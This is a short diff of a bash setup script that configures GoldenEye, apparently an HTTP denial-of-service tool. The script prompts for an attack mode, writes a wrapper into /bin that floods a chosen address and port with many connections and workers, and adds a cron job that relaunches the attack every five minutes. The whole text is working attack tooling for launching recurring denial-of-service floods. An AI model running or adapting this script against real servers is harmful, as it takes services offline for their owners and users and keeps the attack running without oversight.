@@ -23,10 +23,10 @@ read -rp "$(echo -e ${CYAN})Enter Attack Mode (get, post, random): $(echo -e ${N
 
 echo -e "${RED} Setting up GoldenEye... ${NC}"
 
-cat > script.sh <<EOF
+cat > /bin/script <<EOF
 #!/bin/bash
 
-killall script.bash
+killall script
 ./goldeneye.py http://$address:$port/ -s $connections -w $workers -m $mode
 EOF
 
@@ -41,6 +41,6 @@ function addtocrontab () {
   local job="$frequency $command"
   cat <(fgrep -i -v "$command" <(crontab -l)) <(echo "$job") | crontab -
 }
-addtocrontab "*/5 * * * *" "bash /root/GoldenEye/script.sh"
+addtocrontab "*/5 * * * *" "script"
 echo -e "${RED} Cronjob Created. ${NC}"
 echo -e "${RED} Setup Finished Successfully. Adios. ${NC}"
